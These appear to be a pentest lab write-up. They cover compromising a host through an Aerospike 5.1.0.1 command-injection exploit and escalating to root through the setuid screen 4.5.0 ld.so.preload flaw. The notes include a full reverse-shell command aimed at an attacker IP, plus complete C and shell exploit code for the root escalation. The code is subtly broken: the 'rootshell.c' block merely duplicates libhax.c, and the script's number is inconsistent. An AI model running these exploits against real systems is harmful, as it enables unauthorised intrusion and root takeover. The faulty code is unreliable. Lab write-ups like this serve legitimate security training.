# Take Away
- After identifying a path under `/api`, try to brute force without any extension to increase the speed.
- Sometimes, `linpeas` gives false positives that one needs to filter out. 
- Remember to read each line of `linpeas` output carefully, if can't find obvious PE. Sometimes, details link each other in a way that forms a potential PE option.
# Exploitation
- Directory Brute-Forcing will discover a URL `/api/heartbeat` and, upon visiting the URL, one can identify a service called `aerospike` which probably corresponds to whatever is running at port `3000-3003`.![[Pasted image 20240215150002.png]]![[Pasted image 20240215142618.png]]![[Pasted image 20240215142648.png]]
- The assumption can be confirm at `aerospike`'s Official Website and by using telnet to connect to port `3003` and running `build` command to retrieve the version number as `5.1.0.1`.![[Pasted image 20240215151359.png]]![[Pasted image 20240215151618.png]]
- `searchsploit` will identify a `Command Injection` against `5.1.0.3` which should also work on `5.1.0.1`. ![[Pasted image 20240215152027.png]]
- For the script to work out of the box, we need to disable `version_check` and `register_udf` since the two functions are bugged. Run `python3 49067.py --ahost 192.168.191.143 --netcatshell --lhost 192.168.45.229 --lport 443` to receive a reverse shell call back.![[Pasted image 20240215154946.png]]
# PrivEsc
- `linpeas`'s `linux exploit suggester` points out that the target is potentially vulnerable to `setuid screen v4.6.0`. ![[Pasted image 20240215165843.png]]
- Then, in the later section, we can confirm that the target has exact version of  `screen` installed.![[Pasted image 20240215170107.png]]
- Run `searchsploit -m 41154` to retrieve the exploit. However, the exploit needs a major modification. First, generate `libhax.c` and  `rootshell` , then transfer them to the target under `tmp` folder. Finally, run `41154.sh` to obtain a root shell
- `libhax.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
     chown("/tmp/rootshell", 0, 0);
     chmod("/tmp/rootshell", 04755);
     unlink("/etc/ld.so.preload");
     printf("[+] done!\n");
}
```
- `rootshell.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
     chown("/tmp/rootshell", 0, 0);
     chmod("/tmp/rootshell", 04755);
     unlink("/etc/ld.so.preload");
     printf("[+] done!\n");
}
```
- `41554.sh`
```shell
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
gcc-9 -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc-9 -o /tmp/rootshell /tmp/rootshell.c

echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed

echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```